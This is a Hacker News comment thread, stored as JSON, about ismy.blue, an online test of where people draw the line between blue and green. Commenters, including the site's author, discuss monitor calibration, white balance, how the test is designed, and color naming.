[
  {
    "id": 41430258,
    "title": "Is My Blue Your Blue?",
    "originLink": "https://ismy.blue/",
    "originBody": "Test your color categorization This is blueResetThis is green",
    "commentLink": "https://news.ycombinator.com/item?id=41430258",
    "commentBody": "Is My Blue Your Blue? (ismy.blue)1048 points by bpierre 17 hours agohidepastfavorite435 comments doe_eyes 17 hours agoI suspect it tests your monitor and monitor calibration as much as your color perception. In particular, sRGB displays have a pretty severely limited green gamut. If you have a wide-gamut display, the test is probably gonna appear different. But another problem is with displaying the colors essentially full-window, which is going to be nearly-full-screen for many users. When we're staring at a screen with a particular tint, our eyes quickly do \"auto white balance\" that skews the results. It's the mechanism behind a bunch of optical illusions. To address that last problem, I think the color display area should be much smaller, or you should be shown all hues at once and asked to position a cut-off point. reply pminimax 15 hours agoparentAuthor here, yes, it tests a mix of your monitor calibration and colour naming. The two types of inferences you can make with this are: 1. If two people take the test with the same device, in the same lighting (e.g. in the same room), their relative thresholds should be fairly stable. 2. If you average over large populations, you can estimate population thresholds, marginalizing over monitor calibrations. The most interesting thing for me is that while cyan (#00ffff) is nominally halfway between blue and green, most people's thresholds, averaged over monitor calibrations, imply that cyan is classified as blue. I was not expecting that the median threshold (hue 174) would be so deep into the greens. reply egypturnash 14 hours agorootparentI got hue 174 as my threshold and really I just wanted to say \"neither, this is turquoise/teal\" for most of the questions. But blue/green was the only option. reply hammock 1 hour agorootparentHere is a chart of HN reader results, based on two pages of comments: https://i.imgur.com/tIQfTjN.png Mean is 176 Median is 175 Mode is 174 reply hammock 1 hour agorootparentprevThe point is to determine whether turquoise to you is more green, or more blue. reply riffraff 13 hours agorootparentprevFun, I got 174 and when I saw the results my reaction was \"but that is not turquoise!\" which I suppose means I either don't know what turquoise is, or my screen has bad calibration/gamut. reply naijaboiler 2 hours agorootparentNobody knows what turquoise is reply dsego 2 hours agorootparentprevI got 174 as well. reply aaroninsf 2 hours agorootparentMe too... Apple Silicon era MBA, with Samsung 4K display with corresponding U28D590 driver... reply wodenokoto 10 hours agorootparentprevMe too, but I liked the conclusion (\"to you, turquoise is blue/green\") reply amelius 5 hours agorootparentTo be honest, when I got turquoise and had to choose blue or green, I just thought \"oh whatever\" and picked one randomly. reply JAlexoid 3 hours agorootparentprevI actually disliked the conclusion, because it forced me to classify turquoise as either blue or green. When it's a mix more than anything. It lacks the \"can't classify\" to make it a better tool. reply subsubzero 1 hour agorootparentyeah kind of a waste of time, what is this 50% mixture of green and blue? pick one - Blue or Green answer it should have: Its both reply loopdoend 9 hours agorootparentprevThat must be the perfect result. I also got 174 but it said \"For you, turquoise is green.\" reply Filligree 5 hours agorootparentBut it isn't. Turquoise is turquoise, and since that wasn't an option, I picked one at random. reply anamexis 4 hours agorootparentThe whole point is demarcating the line between where colors seem more-blue-than-green, and more-green-than-blue. reply ryandrake 4 hours agorootparentThat wasn't clearly part of the test. To be ultra-pedantic (this is HN after all), the user's choices don't say \"This is more-blue-than-green\" and \"This is more-green-than-blue\". The choices are only \"This is green\" and \"This is blue\" forcing you to just pick one, where there is no clearly correct choice. When the color on the screen is neither green nor blue, many people will just pick a random answer. I bet if the choices actually said \"This is more green than blue\" the results would be different. reply anamexis 3 hours agorootparent> When the color on the screen is neither green nor blue, many people will just pick a random answer. Or people will naturally intuit that they should choose whichever answer they think is closer to true. reply amonith 3 hours agorootparentOn such a random internet doodad most users will pick a random answer period. To see what this thingy tries to do without wasting any time on it. I hope it doesn't try to do gather any meaningful data. Personally I \"tried\" to answer truthfully at first and then went absolutely \"ok f u, don't care no more\" when it showed turquoise :D reply fragmede 2 hours agorootparent> most users will pick a random answer period. Taking how you behave, and extrapolating that it to everyone, (and furthermore being unable to accept that other people might behave differently), is not a winning strategy for life. reply amonith 2 hours agorootparentThere is no winning in life. And I'm doing fine tyvm ;) reply JAlexoid 3 hours agorootparentprevOr most likely people will come out with a severe feeling of dissatisfaction with the results. reply samstave 3 hours agorootparentprevTurquoise is blue with green , so if it asked me to pick I’d pick green. Because if they have eggs then pickup a dozen milks HN pedant here reply Filligree 2 hours agorootparentprevTurqoise doesn't feel either more-green-than-blue or more-blue-than-green. It feels neither blue nor green, and I don't see any way to compare it to either. It's clearly more turqoise than blue. Or green. Turqoise on a computer monitor is always missing part of itself, so maybe I should've answered based on that, but I don't think the computer monitor was the point. reply Woshiwuja 6 hours agorootparentprev176 for me its blue reply jimz 5 hours agorootparent180 and blue and I suspect that language also plays a part (I was brought up in an environment where the word turquoise starts with green, but now live in a turquoise-producing state where the finished product look far blue-r.) reply Woshiwuja 4 hours agorootparenti mean i always saw turquoise as a greenish light blue, so it kinda makes sense reply bryanrasmussen 12 hours agorootparentprevit looks like my default is if there is 40% green in that it is green. Thus it told me that turquoise for me is green. Which if I look at Turquoise the RGB color, that is green. If I look at Turquoise the mineral about half the time it is green and half the time blue. reply Tor3 12 hours agorootparentprevSame thinking here, though I got 184 reply plorkyeran 14 hours agorootparentprevSame, my answer was “neither” after the third color so I just alternated between blue and green until it stopped. reply ljsprague 10 hours agorootparent\"Neither\" is the coward's choice. reply jsvlrtmred 7 hours agorootparentIs a crab a mammal or a reptile? reply pepve 6 hours agorootparentI'm not gonna fight you on that. reply xattt 6 hours agorootparentprevIs a hot dog a sandwich? reply jimz 5 hours agorootparentIs a burrito a sandwich? (Yes in New York and Indiana, no in Massachusetts, and the law is silent elsewhere. Personally I believe that because the torta exists, the burrito may have some characteristics of a sandwich but should be considered a wrap) reply Nav_Panel 3 hours agorootparentNo, it's a calzone, per https://cuberule.com/ reply bumby 5 hours agorootparentprevOf course. It's a bologna sandwich in log form. reply Suppafly 3 hours agorootparent>It's a bologna sandwich in log form. Finally someone else realizes that hotdogs are basically just bologna. reply falcolas 4 hours agorootparentprevIt's an insect. 6 legs, exoskeleton, etc. reply digging 3 hours agorootparentI know you're making a joke about classification, but crabs have 10 legs, not 6. reply falcolas 17 minutes agorootparentMy bad, I misremembered. 6 walking legs, two swimming legs, two pincer legs. dotancohen 11 hours agorootparentprevTry looking away between tests. I tried twice and got 182, then 184. Which I suppose it more or less consistent. reply itronitron 35 minutes agorootparentprevI checked in at hue 174, the median, which is interesting to me as I know that my wife will test to a very different hue as we have occasional disagreements on whether something is 'blue' or 'green' :) reply ddejohn 15 hours agorootparentprevI'd love a last step in the test where you're presented with the gradient, but before showing the distribution and the user's score. Allow the user to select where they consider their threshold, then display the final results. reply rsyring 14 hours agorootparentI really wanted to be able to drag my vertical bar on the distribution to the right just a bit. :) When I could see the entire gradient, I actually thought green continued to the right a bit more than where my line was. reply pminimax 15 hours agorootparentprevThat's fun! I bet people would tend to nudge the threshold toward the middle of the scale. Or you could do a sorting interface, etc. reply ddejohn 15 hours agorootparentA sorting interface would be another neat step! And yeah, I think most would gravitate toward the middle. Seeing how \"far off\" you are would be fun :) Ooh maybe have the user slide a gradient left and right inside a window, aligning the center of the window with where they think the line is between blue and green (i.e., instruct the user to fill the window with equal amounts of green and blue). reply Veve 7 hours agorootparentIlovehue and ilovehue 2 are excellent mobile games around this sorting idea, they're quite zen and for all ages, highly recommendend! reply martyvis 10 hours agorootparentprevThis test gets you sort hues along a gradient. https://www.xrite.com/hue-test reply smeej 8 hours agorootparentIt tells me to rotate my device, implying it should work on my phone, but I can't figure out how to move the colors. Holding and sliding doesn't work. Tapping doesn't seem to do anything. Does it not actually work on mobile? reply martyvis 7 hours agorootparentWorks on my android fine. reply aaomidi 15 hours agorootparentprevThats genius reply codeflo 9 hours agorootparentprev> The most interesting thing for me is that while cyan (#00ffff) is nominally halfway between blue and green, most people's thresholds, averaged over monitor calibrations, imply that cyan is classified as blue. Perceptually (that is, in CIE-LCh color space, for example), the hue component of #00ffff is a lot cloer to #00ff00 than it is to #0000ff. But the website doesn't ask which color is closer, it asks if it's \"green\" or \"blue\". And how we use those words has more to do with culture than with perception. We also call the color of a clear afternoon sky \"blue\", even though that is perceptually extremely far away from #0000ff. reply blahedo 13 hours agorootparentprev> while cyan (#00ffff) is nominally halfway between blue and green, most people's thresholds, averaged over monitor calibrations, imply that cyan is classified as blue Yes, because (at least for me) the thought went \"well that's cyan, it's not really blue but if forced to pick, cyan is more like blue so I'll click that\". It's like rounding up at 0.5. reply Tor3 12 hours agorootparentFor me it was like \"if forced to pick, cyan is more like green\". So I kept clicking green and got 184. reply ryandrake 4 hours agorootparentFor me, if forced to pick between two choices that were not correct, I'd just pick one randomly. I think this is a wording problem more than anything. reply Suppafly 3 hours agorootparent>For me, if forced to pick between two choices that were not correct, I'd just pick one randomly. I think this is a wording problem more than anything. That's what I'd do if I were being paid to take the survey. Instead I just closed the window as soon as it popped up cyan and only gave me blue and green as options. reply jedberg 1 hour agorootparentprev> I was not expecting that the median threshold (hue 174) would be so deep into the greens. You're not asking gender of the test taker. Your results will be skewed because you're probably getting more men than women. Women in general have more ability to detect green vs blue. reply dentemple 1 hour agorootparentEven more fundamentally, red-green colorblindness is a recessive trait on the X chromosome, thereby affecting biological males in far greater number than females. It could be a high enough percentage to make the results from this site noticeably different between the sexes. reply Jaxan 11 hours agorootparentprevI refuse to call cyan either blue or green. It’s clearly in between. Just like I would never call orange yellow or red. reply naijaboiler 2 hours agorootparentI refuse to call cyan cyan. I just call it blue-green reply nobrains 6 hours agorootparentprevprimary: yellow, red, blue secondary: green, orange cyan: not primary nor secondary. i hope that helps. reply crazygringo 6 hours agorootparent> cyan: not primary nor secondary. That's incorrect. The 3 primary colors of light are red green blue. The 3 secondary colors are yellow, cyan, and magenta. The 3 primary colors used in printing are cyan, magenta, and yellow (why it's called CMYK where K is black). Cyan is primary or secondary in both of the major color models. https://en.m.wikipedia.org/wiki/Secondary_color#RGB_and_CMYK reply fwip 2 hours agorootparentCMY and RYB are both valid primary color sets. RYB, being taught in grade school, has a lot of influence on how people perceive and name colors, which is what this conversation is about. reply Suppafly 3 hours agorootparentprev>most people's thresholds, averaged over monitor calibrations, imply that cyan is classified as blue. I think that's just to your test forcing people to pick either blue or green even though cyan is both, they are just going to pick blue because it's the first option and more likely to be picked randomly. reply LocalH 3 hours agorootparentprevI classified cyan as green because, well, it's greener than pure blue, and it's also the most greener you can get than blue, in RGB space, without losing any blue :) reply zestyping 9 hours agorootparentprevNot that surprising. To most people, pure RGB-blue looks a bit violet. People are used to ink (subtractive) blue more than light (additive) blue. People call the sky blue and water blue; both are closer to cyan. Most people think of a neutral blue as something like #0080ff. reply lupire 6 hours agorootparent> To most people, pure RGB-blue looks a bit violet. And then our mothers and teachers mock us :-( Is this color bias the same across genders? reply tgsovlerkhgsel 10 hours agorootparentprevI'd check whether there are biases depending on which color you start with / which colors you present when. reply lupire 6 hours agorootparentprevIn USA: Primary Additive Colors: Red, Green, Blue Primary Subtractive Colors: Cyan, Magenta, Yellow But, before digital color displays became popular, the average person had, by far, mostly exposure to subtractive (paint) colors. US school children are taught from birth that the primary subtractive colors are red, yellow, and blue, simply because those words are easier to pronounce, and so magenta is a weird \"red\" and cyan is a weird \"blue\" , until the children discover on their own, or in specialized print/paint schools, red and blue are not primary subtractive colors. Humans are terrible at naming things. And to bring it back to Current Thing: Google AI cites this source for its red/yellow/blue claim, even though explicitly this source says that Google gives the wrong answer. https://science.howstuffworks.com/primary-colors.htm#:~:text.... Will GenAI's aggressive ignorance kill sarcasm and nuance in writing? Or will people learn to ignore AI input like they ignore banner ads? reply hilbert42 6 hours agorootparentprevThis test is useless or of very limited value. I kept pressing green until the end because you had no 'cyan' button to press when clearly many colors were actually cyan. Cyan is not blue. Incidentally, my color vision is perfect on all Ishihara tests. reply nobrains 6 hours agorootparentBlue and Green and primary and secondary colors. Cyan is not. The author decided to cut off the colors list at secondary colors. There is nothing wrong with that. reply digging 3 hours agorootparentNot to be mean, but I think every assertion in your comment is wrong. Blue and Green are English words which sometimes describe primary or secondary colors additive colors. Cyan is (an English word that describes) a primary subtractive color. Colors are not English words. They're physical reactions inside our eye-brain systems, affected by varying wavelengths of light. (Actually that's not the most accurate description of color either, but it's a more useful model.) reply aaroninsf 2 hours agorootparentprevOP have you considered doing a version for this to test contemporary Greek native speakers, vs others (\"control\" group), for differentiation of blues? I remember reading that modern Greek has two color-names for sky- and dark- blue (not sure what the prototypes are for each nor if they have hue components, maybe the \"sky\" blue is green-shifted?)... always been fascinated by the discussion of \"weak Sapir-Whorf\" around this and would be quite interested to see if there are any differences in discrimination... The classic cognitive/perceptual psyche data to gather would be time-to-discriminate, with the prediction being that Greek speakers make faster judgement because they have higher/faster discrimination, than others. Not sure how you'd pose the question to non-Greek speakers tho :) reply samstave 3 hours agorootparentprevWouldn’t this then be best for calibrating VR headsets most? reply mschuster91 4 hours agorootparentprev> 2. If you average over large populations, you can estimate population thresholds, marginalizing over monitor calibrations. This might be one case where it might make sense to cluster between the reported operating system. At the moment I only have a family of Macs to test, but I can imagine that Windows users with their different default gamma get back different results. reply jsvlrtmred 7 hours agorootparentprevAnother variable is the name of the website. If the page were called \"is my green your green\" perhaps you'd get the opposite result... reply nov21b 5 hours agorootparentprevI did this test with tinted sunglasses, could be another factor (boundary at hue 172) reply lloeki 11 hours agoparentprevAmbient light will also affect the result. Not necessarily because the ambient light would affect the screen shows (it's emissive, not reflective) but because the brain also does \"auto white/colour balance\". For a fun experiment, get your hand on some heavily yellow-tinted party glasses, go outside on a clear day with a bright blue sky. When you put them on everything will be stark yellow tinged (and the blue sky will be completely off, like green or pink, can't recall which) but after a little while going on your business, perception adjusts and only a much less dramatic yellowish veil is in effect. You'd look at the sky and see almost-blue. The kicker is when you remove the glasses: the sky will suddenly be of a glorious pink! (or green, can't recall) Only moments later it'll adjust back to be blue. A certain wavelength may be absolute blue of a certain kind, but the perceptual system is all relative: \"wait, I know this sky should be blue because that's what I've always seen, so let's compensate\". The same kind of effect - although less dramatic - can be achieved with lights that can be adjusted from say 2400K to 6500K and having as reference an object that is known \"pure white\", like a A4/letter sheet of paper. This effect, in turn, adjusts how \"absolutely displayed\" colours are identified by way of biasing the whole perceptive system. AIUI that's the rationale behind Apple's True Tone thingy, aiming to compensate for that. So the result of this test should be somewhat different depending on ambient lighting temperature. reply cubefox 9 hours agorootparentDigital cameras also do automatic white balance (between yellow and blue) to mimic the automatic white balance of our eye/brain. If cameras didn't do white balance, outdoor photos with sunlight during noon would look extremely blueish, or indoor photos with artificial light would look extremely yellowish. I like this illustration of how strong our natural white balance is: https://en.wikipedia.org/wiki/The_dress#/media/File%3AWikipe... reply MereInterest 8 hours agorootparentDuring some heavy dust clouds from nearby wildfires, the sky was a deep and unsettling yellow. However, I couldn’t get a picture of it, because the automatic color balance removed the yellow overcast altogether. reply cubefox 6 hours agorootparentThe same problem occurs with photographing the yellow sky when dust from a Sahara sandstorm (presumably coming across the strait of Gibraltar) blows over Europe every few years. But you can set the white balance manually in the camera. reply cubefox 9 hours agorootparentprev> AIUI that's the rationale behind Apple's True Tone thingy, aiming to compensate for that. No idea what \"AUIU\" is, but yes, generally displays should do automatic white balance like iPhones do. I don't know why most Android phones don't seem to do it (pretty sure mine doesn't), and generally TVs/monitors also don't do it. (The required color temperature sensor can't be that expensive?) reply lloeki 7 hours agorootparent> I don't know why most Android phones don't seem to do it (pretty sure mine doesn't), and generally TVs/monitors also don't do it. The rageguy one would say either patents or \"whoa the colors really pop I want that shut up here's my $$$\" uncancellable LOOKATMEIAMTHESHINY mall mode, but via Occam'r razor I think mostly because they (manufacturers) simply don't care (about consumers, or about making a good product at all) TVs/monitors (or laptops even, and more phones that you'd believe) with just a simple auto-brightness are stupendously rare even though Apple does it since forever and a half ago. reply cubefox 6 hours agorootparentYeah, laptops and TVs not even doing automatic brightness is even more absurd. Though Android phones have automatic brightness since forever, so why do many not have automatic color temperature (white balance)? The color temperature sensor can't be much more expensive than a brightness sensor. It's logically just an RGB brightness sensor. Android does have a night mode which changes the white balance of the screen at sunset and sunrise, but this is just a binary thing and doesn't respond to actual ambient light. reply nkrisc 9 hours agorootparentprevAIUI as I understand it reply cubefox 9 hours agorootparentYeah I don't know what that is reply nkrisc 5 hours agorootparent[A]s [I] [U]nderstand [I]t Take the bracketed letters: AIUI reply archi42 8 hours agorootparentprevTYDUI (IMTOU) - Then You Don't Understand It (I Made That One Up) ;-) It's an abbreviation, and you're one of today's lucky 10000 - https://xkcd.com/1053/ for an explanation of the 10000 phrase. reply cubefox 6 hours agorootparentAt least I know that cartoon. But generally people strongly overestimate how many people know various abbreviations. For years I didn't care to look up what \"IANAL\" means. I since have forgotten it again. reply dotancohen 11 hours agorootparentprev> Ambient light will also affect the result. Also deliberate software blue light filters. Mine is always on, both on the desktop and on the phone. Many people may forget that they are even using one. reply i_am_a_peasant 10 hours agorootparentAlso my glasses filter blue light. reply cubefox 9 hours agorootparentFancy way of saying they have a yellow tint (: reply i_am_a_peasant 9 hours agorootparentthey're more like green-ish but yeah reply cubefox 9 hours agorootparentThen they filter also some red light... reply dotancohen 8 hours agorootparentThat might explain one of my neighbors' driving at a nearby intersection. reply Izkata 1 hour agoparentprev> I suspect it tests your monitor and monitor calibration as much as your color perception. In particular, sRGB displays have a pretty severely limited green gamut. If you have a wide-gamut display, the test is probably gonna appear different. Also browser choice: https://issues.chromium.org/issues/40401125 reply ChrisMarshallNY 13 hours agoparentprevThis is pretty much the same way that a calibrator works (if you have ever watched a color calibrator running, you know what I mean), but a calibrator doesn't get biased, like the human eye. In order for it to be a true \"neutral\" test, each test would need to be preceded by a \"palate-cleanser\" gray screen, or something, and there would probably need to be a neutral border. > you should be shown all hues at once and asked to position a cut-off point. This is actually the way I have seen this stuff tested, before. reply trebligdivad 4 hours agoparentprevI tried it twice, once on each of my two different monitors (a Dell S2817Q and Dell S2409W) made a few years apart and with completely different settings; and I got 175 on one and 174 on the other. So pretty close even given the difference. reply krick 16 hours agoparentprevI mean, it really just tests arbitrary word usage. I have no fucking clue if turquoise is supposed to be \"green\" or \"blue\", it's turquoise! reply langcss 16 hours agorootparentA bit like \"is this hotdog overpriced\" amd trying to binary search the exact cent where it became overpriced. reply Bluecobra 15 hours agorootparentThat’s easy, any hot dog that is more than $1.50 USD is overpriced. reply eCa 15 hours agorootparentBut you get the price in another currency, and don’t know the exact exchange rate (in place of monitor calibration). reply pjc50 10 hours agorootparentParent was a joke about the Costco fixed price hotdog. UK Costco hotdogs are £1.50, which is not equal to $1.50, reflecting both its arbitrary nature and that UK purchasing power is weaker than the exchange rate would appear. (Computer books are a frequent offender here of having the same $ and £ prices) reply mrweasel 11 hours agorootparentprevThat might be a language issue. In Danish it's common to use \"turkis blå\", i.e. turquoise blue. Then again, you can also use \"turkis grøn\", turquoise green. reply mewpmewp2 10 hours agorootparentprevBut with green/blue there is certain opinion that I have at least. reply hypertele-Xii 7 hours agorootparentprevTurquoise is dark cyan, no? So equal parts green and blue. reply ibash 16 hours agorootparentprevNah turquoise is green. reply ninetyninenine 15 hours agorootparentNo turquoise is blue. reply chronogamous 10 hours agorootparentWithin the ISCC–NBS System of Color Designation Turqoise (#40E0D0) is classified as a brilliant bluish green. Turquoise blue (#00FFEF) is close to turquoise on the color wheel, but slightly more blue. More metrics, including sRGB, can be found on https://en.wikipedia.org/wiki/Turquoise_(color) reply MathMonkeyMan 16 hours agorootparentprevApparently I thought so as well. Then again, my display is in night mode... reply ibash 15 hours agorootparentOh shit. Turned off night mode and switched sides! reply arcxi 9 hours agorootparentprevthe real question is whether orange is red or yellow reply jdhzzz 5 hours agoparentprevI did it on IPS laptop display and got 175. On my OLED phone I got 179. I am more in agreement with the phone results, but the turquoise on the phone looked even greener to me. reply adgjlsfhk1 2 hours agoparentprevalternatively putting the color in a white box should provide enough context reply resonious 14 hours agoparentprevVery good point. I just realized I did this with my monitor on low-blue-light-mode. reply extraduder_ire 13 hours agorootparentI only realized after seeing your comment. As usual, when I turned it off to compare, the hue it shifted to looked super unnatural and I had to re-enable it. I always forget how much white-balancing my vision does. reply sandworm101 16 hours agoparentprevThese sorts of tests also need to be done in controlled background lighting. Whether people are doing this in a dark room, in a sunny kitchen, or under green led lighting would be a greater factor than anything being tested. reply TuringNYC 16 hours agorootparent>> These sorts of tests also need to be done in controlled background lighting. Whether people are doing this in a dark room, in a sunny kitchen, or under green led lighting would be a greater factor than anything being tested. Whether its a dark room or sunny kitchen, i'm not sure whether Turquoise is ever going to be blue or green. The entire question seems more like wordplay. reply AlotOfReading 16 hours agorootparentprevI don't think that's necessary for an informal test. Human color perception is extremely good at compensating for that and modern screens are relatively uniform and uniform besides. Cultural differences like the person downthread saying they consider anything with the slightest hint of green to be \"green\" seem far more impactful. reply Inviz 13 hours agoparentprevIf sRGB has severly limited green, what would you say about CMYK? reply lifthrasiir 13 hours agorootparentCMYK is generally even more limited in the colorness to the end of gamut. reply collyw 9 hours agoparentprevI was looking it and thinking that's turquoise. Is it closer to blue or green? Meh, it's close to the middle. reply fogleman 17 hours agoprevI think this is flawed. You quickly end up on a color that's clearly not \"blue\" or \"green\" and you're unlikely to keep hitting \"this is green\" several times in a row, conceding that ok, fine, maybe this is blue, whatever. You're basically measuring how many times people are willing to click the same button in a row. Edit: Possible improvements: changing the wording to \"this is MORE green\" and \"this is MORE blue\" and randomizing the order in which they are shown, somehow. I realize you're just doing some kind of binary search, narrowing the color range. This is not to mention color calibration of your monitor, or your eyes adjusting / fatiguing to the bold color over time... reply pminimax 15 hours agoparentThe order is randomized. Hit reset and you'll get a different sequence. The sequence is also adaptive (not a binary search---it's hitting specific points of the tail of a sigmoid in a logistic regression it's building as you go along). Try it a few times and you'll see how reproducible it is for you. It of course depends on the calibration of your monitor. One of the reasons I did this project is I wanted to see if there were systematic differences in color names and balance in the wild, for example, by device type (desktop vs. Android vs. iPhone), time of day (night mode), country (Sapir-Whorf), etc. reply lifthrasiir 13 hours agorootparentThe sequence itself should be converging however, right? I feel that there should be some random jumps outside of the current confidence interval so that contextual aspects can be filtered out or at least recognized. reply isoprophlex 12 hours agorootparentYes, exactly this. Because it seems to be converging right now, I quickly get the feeling that there's no meaningful choice, after the first three prompts you end up with something that's neither green nor blue. Re-taking the test gave me a very different score. It might work better for me to do some contrastive questioning: show a definite green followed by an intermediary color, then a definite blue followed by an intermediate color. reply wodenokoto 10 hours agorootparentThe whole point of asserting where your border between green and blue is, is to ask about colors that are in between the two. It doesn't make sense to ask is RGB(0,0,255) blue to you? Well, unless you are color blind it is. reply isoprophlex 9 hours agorootparentOf course, that's clear as day; the idea is to reset your presumptions from the previous trial and sample the ambiguous colors in a more consistent way, by priming you from the extreme ends of the green/blue scale. See it as a way to avoid perceptual hysteresis. reply Rastonbury 14 hours agorootparentprevThese results would be interesting reply Al-Khwarizmi 9 hours agoparentprevI definitely have the bias you mention. In my case I don't think it's mainly due to not wanting to push the same button many times in a row, but because I compare with the previous color, so if previously I was already somewhat unsure but I chose green and now it became slightly bluer, it \"must\" be blue, right? I think I can get over it, but it requires conscious effort and even then, who knows. Bias is often unconscious. Another possible improvement would be to alternate the binary search colors with some randomly-generated hues. Even if those answers are outright ignored, and the process becomes longer, I think they would help to alleviate that bias. At least you wouldn't be directly comparing to the previous color. reply yarg 16 hours agoparentprevI'd prefer blue/green/neither. With the third colour, I just thought \"no, that's teal\", and my decision was (as you suggested) semi-arbitrary. reply pminimax 15 hours agorootparentIt is common practice in psychometrics to use two levels in a forced choice and model responses as a logistic regression, which is what's done here. Adding an option turns the thing into an ordered logistic regression with unknown levels, which is tricky to fit, but it's possible. Having done a lot of psychophysics, having more options generally doesn't make the task easier. reply EasyMark 4 hours agorootparentThat’s why I took the test 5 times, and my scores varied between 63% and 69% “green” so I took the average at 66.4 reply zarzavat 11 hours agorootparentprevThe way that XKCD did it is the best, you ask people to give a name to each color then the responses are entirely natural and unprompted. I don’t think that forced choice can give accurate results if a substantial number of people perceive green and blue as being non-adjacent - i.e. there exists a color between green and blue (turquoise/cyan/teal). Otherwise it’s like asking people whether a color is red or yellow, when it’s clearly a shade of orange. reply cubefox 9 hours agorootparent> Otherwise it’s like asking people whether a color is red or yellow, when it’s clearly a shade of orange. No it's like asking people whether a color is red or green, when it's clearly a shade of yellow. https://en.wikipedia.org/wiki/Color_wheel#/media/File%3ALine... reply ljsprague 10 hours agorootparentprevSome shades of orange are closer to red and some are closer to yellow. reply zarzavat 9 hours agorootparentYes but saying that a shade of orange is closer to yellow is different from saying that it is yellow. Orange is closer to green than blue but I wouldn’t say that it’s a shade of green. It’s just orange. reply bofadeez 15 hours agorootparentprevSounds like psychometrics is unsuitable for modeling this problem, according to what you're saying. When you have a hammer everything looks like a nail. reply tripzilch 10 hours agorootparentprevAre you sure that it is common practice for a problem that has three valid answers A, B and C, to only allow people to answer A or C? Your website is not talking about \"levels\" of colour. It's asking \"is this blue or green\", not \"is this closer to blue or closer to green\". The question (1) \"is this blue or green\" has three valid answers: blue, green or neither. The question (2) \"is this closer to blue or green\" only has two valid answers. I would assume that with these types of surveys, the first thing to do is to qualify the proper categorization of the question. Sorry to say, but to me it seems that almost all of the confusion in the discussion here is because you're asking question (1) (which has three valid answers) but expecting an answer from (2) (which indeed has two valid answers). reply adamhartenz 16 hours agorootparentprevbut is the teal more green or blue. You should be able to answer that reply yarg 16 hours agorootparentIs zero more positive or negative? You should be able to answer that. reply Feathercrown 15 hours agorootparentBut teal isn't a single point, it's a range. You can have teals that are more blue or more green than each other; they can't all be zero. Whichever one you choose to be the true transition point between blue and green, there will be teals that are more blue or green than that one. reply yarg 14 hours agorootparentSure, but there's also a subrange at the (subjective) centre of that range that will not be perceived as either more blue or more green. And the teal that I referenced in my earlier comment was (for me) such a colour. reply delecti 4 hours agorootparentThen by that framing, the test is asking you to decide what hue value is the \"zero\" between the positive/negative blue/green. Is the wording imperfect? Sure, but the intent was still entirely clear. reply nayroclade 14 hours agorootparentprevSaying it’s a subrange implies you can perceive differences in tone within it. In which case, reframe the question as “is this shade of teal closer to the blue or green end of the subrange” if you like. reply reichstein 12 hours agorootparentThat's not how it works. Maybe if I'm given two colors inside that range, I can say which is bluer and which is greener. Given just one color, I simply cannot say that it's green or blue, or even if it's more green than blue or vice versa. I stopped at the 3rd or 4th come because I couldn't give a honest answer. That makes the test useless. I can't complete it with correct answers, and if I give incorrect answers, the conclusion is useless. reply yarg 14 hours agorootparentprevNo it absolutely doesn't. It's a well know fact that people are unable to distinguish colours that are too close together. You could even have a smooth gradient from colour 'a' through colour 'b' to colour 'c', where it's possible to distinguish 'a' from 'c' but not to distinguish 'b' from either 'a' or 'c'. reply lifthrasiir 13 hours agorootparentprevI think the main point of this test was to determine the position of teal in your case, as your definition of teal is the midpoint(-ish range) between blue and green. (For me it's more blue though.) reply yarg 13 hours agorootparentThen call it something else. But the point stands that there's a point at and around which the colours are neither blue nor green. reply lifthrasiir 13 hours agorootparentI mean, a good test would be able to detect that neither-blue-nor-green range and approximate midpoint as well, and it should be fair to say the midpoint is indeed the threshold between blue and green. (I don't think the current version of test can do this, though.) reply yarg 13 hours agorootparentI actually checked that at the end of the test (when it shows the gradient image with the response overlay). There were two distinct points, one for blue and one for green, where my mind would place the transition to the colour in between. (And yes, on one end it's bluer and on the other end greener, but (much like a shade of orange is neither red nor yellow) the colours are still not either green or blue.) reply jdiff 15 hours agorootparentprevMore positive. -0 is more negative. reply yarg 15 hours agorootparentIt's neutral (-1 * 0 ≡ +1 * 0); don't confuse it for an infinitesimal (which can be positive or negative). reply zeven7 8 hours agorootparentI think they were referring to -0 in floating point, which does exist as a separate value from +0 https://en.m.wikipedia.org/wiki/Signed_zero reply lll-o-lll 14 hours agorootparentprevNah, zero definitely feels a bit more positive to me. reply mewpmewp2 10 hours agorootparentprevTrue zero is very rare. So you are saying that teal just happens to be the true zero? reply Narishma 5 hours agorootparentprevIt's more teal. reply antisthenes 15 hours agorootparentprevNope. On RGB, they are equal parts blue/green. Since most people are viewing this on a monitor, the question is pointless. reply elcomet 6 hours agorootparentprevBut this choice has very limited impact; as you are already in a very narrow window of color reply KaiserPro 9 hours agoparentprevVFX engineer here. Yes we used to cailbrate monitors and work in the dark. However one of the key people that built our colour pipeline was also colour blind, so its not actually a requirement, so long as you use the right tools. Most people aren't that sensitive to colour, especially if its out of context. a minority of people aren't that good at relative chromaticity as well (as in is this colour bluer/greener/redder than that one) But a lot of people are. Language affects how you perceive colour as well. But to say the experiment is flawed I think misses the nuance, which is capturing how people see colour _in the real world_. Sure some people will have truetone on, or some other daily colour balance fiddling. But thats still how people see the world as it is, rather than in isolation. reply MisterBastahrd 2 hours agorootparentI once worked for a company that had a designer who was color blind. He would always show up wearing the exact same outfit every day: turns out that he was REALLY color blind, and so he just gave up and bought 7 long sleeved shirts and 7 pants, all black. Didn't work out so well for him in the designs... most companies don't want monochrome websites. reply tptacek 16 hours agoparentprevOne issue with it: I did it 3 times and got 3 very different results. reply Retr0id 16 hours agorootparentLikewise. I think for me there's quite a wide band of colours in the middle that I consider to be \"neither/either\", so I'm basically just picking a random answer for those. A modified version of the test that finds two boundaries (green/neither/blue) could be interesting. Or maybe it just needs to take more samples, in a more random order. reply wzdd 15 hours agorootparentprevSame. Some of them are neither obviously blue nor obviously green, so what the test was measuring for me was what I was thinking about at the time, the decision I'd previously made, whether my mouse was currently hovering over \"blue\" or \"green\", etc. reply fsckboy 16 hours agoparentprev>I think this is flawed. You quickly end up on a color that's clearly not \"blue\" or \"green\" and you're unlikely to keep hitting \"this is green\" several times in a row, conceding that ok, fine, maybe this is blue, whatever. I agree with you, the whole thing is flawed when it could be better. When you ask the question \"is my blue your blue?\", you are evoking the old philosophical question, and it's a question about color perception, not words. This test did not test color perception, it tested \"what word do you use?\" I think of blue as a pure color, and green as a wide range of colors all the way to yellow, to me another pure color. so if there's any green at all in it, I'm going to call it green. (maybe it's left over from kindergarten blending \"primary colors\". also, while I like green grass, I don't like green as a color, so any green I see is a likely to make me think, ew, green) But in 